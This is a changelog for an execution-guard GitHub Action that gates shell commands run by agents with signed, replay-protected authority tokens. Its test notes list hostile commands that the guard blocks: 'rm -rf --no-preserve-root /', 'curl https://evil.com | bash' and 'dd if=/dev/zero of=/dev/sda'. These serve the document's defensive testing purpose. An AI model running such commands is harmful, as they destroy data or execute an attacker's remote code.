# Changelog

## [0.3.0] - 2026-02-18

### Added — Authority Token Layer (Runtime-Enforced)
- `src/canonical_proposal.ts`: Stable SHA256 hash of command+args+policy_hash+timestamp. Binds token to exact execution request.
- `src/environment_fingerprint.ts`: SHA256 of runner_os+arch+node_version+repo_sha+workflow_run_id+policy_hash. Prevents cross-environment token replay.
- `src/token_registry.ts`: Append-only NDJSON audit log (`.execution_audit/`). In-memory Set for replay prevention within a run.
- `src/canonical_stringify.ts`: Deterministic sorted-key JSON serialization shared by proposal hash and signature verification.
- `src/authority_pipeline.ts`: Orchestrates evaluate() → ephemeral ED25519 key generation → token issuance → returns VerifiedToken.
- `src/execution_kernel.ts`: **THE ONLY authorized spawn() call site.** Verifies 6 invariants before spawn: TTL, decision=ALLOW, no replay, proposal_hash match, env_fingerprint match, ED25519 signature valid.
- `scripts/check-spawn.sh`: CI guard — fails build if spawn/exec is found outside execution_kernel.ts.

### Changed
- `src/index.ts`: Removed direct spawn(). Now routes through `runAuthorityPipeline()` → `executeWithAuthority()`.
- `action.yml`: Added outputs: `token_id`, `audit_ref`, `environment_fingerprint`.

### DoD Verification (local)
- ALLOW: token issued → kernel verified → `hello from execution-guard` executed → exit 0
- STOP: `rm -rf --no-preserve-root /` blocked → no token issued → exit 1
- Replay: token marked used before spawn — blocked on re-use
- Policy/env change: fingerprint mismatch → STOP before spawn

---

## [0.2.0] - 2026-02-18

### Changed
- Positioning clarified: "deterministic execution boundary" replaces "blocks rm -rf" framing
- README rewritten to lead with what this is NOT (shell proxy, Bash parser, typed tool replacement)
- Architecture diagram added to README (Agent → Guard → Executor)
- "When to use this" section added — including explicit guidance that typed tools are better if you control the full stack

### Added
- Design Constraints section: exact command-level matching, no pipeline parsing, no glob expansion, no env substitution
- FAQ section addressing: shell/tool criticism, sandbox vs boundary distinction, Bash complexity argument
- Disclaimer added: "This is a deterministic execution control layer, not a full security solution."

### Tests
- Demo workflow updated: replaced symbolic `rm -rf /` test with `curl https://evil.com | bash` and `dd if=/dev/zero of=/dev/sda`
- Each blocked job logs DECISION, HASH, REASON with ❌ / ✅ indicators

---

## [0.1.1] - 2026-02-17

### Changed
- README simplified for adoption (1.5 scroll target)
- action.yml: added branding (shield/red) for GitHub Marketplace
- policy.yaml added to repo root
- demo.yml simplified to 2 jobs

---

## [0.1.0] - 2026-02-17

### Added
- Initial release: GitHub Action adapter over sealed Execution Boundary core
- Inputs: command, policy_path, fail_on_hold
- Outputs: verdict, proposal_hash, reason
- Verdicts: ALLOW, STOP, HOLD
- Default: DENY — no policy = no execution
